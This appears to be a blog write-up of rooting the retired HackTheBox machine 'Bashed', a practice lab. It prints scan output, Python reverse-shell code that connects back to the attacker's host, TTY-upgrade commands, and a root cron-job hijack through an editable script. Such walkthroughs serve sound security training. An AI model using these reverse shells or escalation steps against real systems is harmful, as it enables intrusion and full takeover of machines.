---
layout: post
title: "Writeup: HackTheBox Bashed - NO Metasploit"
description: "Rooting Bashed without using Metasploit."
tags: pentest hackthebox writeup
---

This series will follow my exercises in [HackTheBox][]. All published writeups are for retired HTB machines. Whether
 or not I use Metasploit to pwn the server will be indicated in the title.
 
# Bashed

_<small>Difficulty: Easy</small>_

_<small>Machine IP: 10.10.10.68</small>_

The initial port scan returns only 1 port active, a web server.

```bash
sudo nmap -sS -T4 -p- 10.10.10.68
[sudo] password for artis3n: 
Starting Nmap 7.80 ( https://nmap.org ) at 2020-06-07 11:03 EDT
Nmap scan report for 10.10.10.68
Host is up (0.016s latency).
Not shown: 65534 closed ports
PORT   STATE SERVICE
80/tcp open  http

Nmap done: 1 IP address (1 host up) scanned in 11.63 seconds
```

```bash
sudo nmap -A -sC -sV -p 80 10.10.10.68
Starting Nmap 7.80 ( https://nmap.org ) at 2020-06-07 11:04 EDT
Nmap scan report for 10.10.10.68
Host is up (0.013s latency).

PORT   STATE SERVICE VERSION
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Arrexel's Development Site
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Aggressive OS guesses: Linux 3.12 (95%), Linux 3.13 (95%), Linux 3.16 (95%), Linux 3.18 (95%), Linux 3.2 - 4.9 (95%), Linux 3.8 - 3.11 (95%), Linux 4.8 (95%), Linux 4.4 (95%), Linux 4.2 (95%), ASUS RT-N56U WAP (Linux 3.4) (95%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 2 hops

TRACEROUTE (using port 80/tcp)
HOP RTT      ADDRESS
1   11.83 ms 10.10.14.1
2   11.98 ms 10.10.10.68
```

In particular, I note that it is an Apache httpd server likely running version 2.4.18.

Let's enumerate.
My absolute favorite web directory enumeration tool is [gobuster][].

```bash
gobuster dir -w /usr/share/seclists/Discovery/Web-Content/big.txt -t 30 -u http://10.10.10.68/
===============================================================
Gobuster v3.0.1
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
===============================================================
[+] Url:            http://10.10.10.68/
[+] Threads:        30
[+] Wordlist:       /usr/share/seclists/Discovery/Web-Content/big.txt
[+] Status codes:   200,204,301,302,307,401,403
[+] User Agent:     gobuster/3.0.1
[+] Timeout:        10s
===============================================================
2020/06/07 11:10:03 Starting gobuster
===============================================================
/.htpasswd (Status: 403)
/.htaccess (Status: 403)
/css (Status: 301)
/dev (Status: 301)
/fonts (Status: 301)
/images (Status: 301)
/js (Status: 301)
/php (Status: 301)
/server-status (Status: 403)
/uploads (Status: 301)
===============================================================
2020/06/07 11:10:16 Finished
===============================================================
```

`/dev` looks interesting!
Navigating to this directory reveals some PHP scripts.

![phpbash dev dir][]

Hmmm...
Navigating to `/dev/phpbash.php` gives me a semi-interactive web shell as the `www-data` user.

![phpbash terminal][]

I can `cat` the user flag straight from this terminal.
I can get a reverse shell back to my host machine with python:

```bash
python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.14.34",443));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/bash","-i"]);'
```

It is important to change the `s.connect(("10.10.14.34",443));` section to what is applicable for your host.

Now for information gathering to find a privilege escalation vector.
Let's get a TTY shell before I do anything else.

```bash
# In reverse shell
SHELL=/bin/bash script -q /dev/null
# ctrl+z (background netcat reverse shell)
stty raw -echo
fg
reset # Re-initialize the backgrounded reverse shell
xterm
```

`sudo -l` informs me that we can run any command as the `scriptmanager` user without needing a password.

```bash
sudo -l

Matching Defaults entries for www-data on bashed:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User www-data may run the following commands on bashed:
    (scriptmanager : scriptmanager) NOPASSWD: ALL
```

So, let's go ahead and pivot to the `scriptmanager` user. This won't work if your TTY shell is not set up correctly.

```bash
sudo -u scriptmanager /bin/bash
```

Given the name of the user is `scriptmanager`, I imagine this user has some scripts on the system that it has access to manage.
I check for all files on the system owned by this user.

```bash
find / -type f -user scriptmanager 2>/dev/null 
/scripts/test.py
/home/scriptmanager/.profile
/home/scriptmanager/.bashrc
/home/scriptmanager/.bash_history
/home/scriptmanager/.bash_logout
```

Well, `/scripts/test.py` stands out.
Looking at the contents of this file, I see it opens a file and writes out a test string.
It also appears that the created `test.txt` file is owned by root, so there is likely a cron job running on the system where root executes the code in `test.py`.
Interesting!

![test.py script][]

This means we can modify the `test.py` file and wait for root to execute the code.
I tried creating a reverse shell script, but I had TTY errors that I did not resolve.

```python
#!/usr/bin/env python
import socket,subprocess,os
s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
s.connect(("10.10.14.34", 454))
os.dup2(s.fileno(),1)
os.dup2(s.fileno(),2)
p=subprocess.call(["/bin/bash","-i"])
```

On my host:

```bash
listening on [any] 454 ...
connect to [10.10.14.34] from (UNKNOWN) [10.10.10.68] 40738
/bin/sh: 0: can't access tty; job control turned off
# 
```

Reviewing this code while writing this article, I realized I missed `os.dup2(s.fileno(),0)` in my python file.
Try that out and you should get a reverse shell back to your machine.

However, I opted to have the script write the `root.txt` contents to the test file.

```python
#!/usr/bin/env python

p = open("/root/root.txt", "r")
contents = p.read()
f = open("test.txt", "w")
f.write(contents)
p.close
f.close
```

This allows me to then read the `test.txt` file for the root flag.

[gobuster]: https://github.com/OJ/gobuster
[hackthebox]: https://www.hackthebox.eu

[phpbash dev dir]: /assets/img/htb/bashed/dev-dir-list.png
[phpbash terminal]: /assets/img/htb/bashed/phpbash-terminal.png
[test.py script]: /assets/img/htb/bashed/test-py-script.png
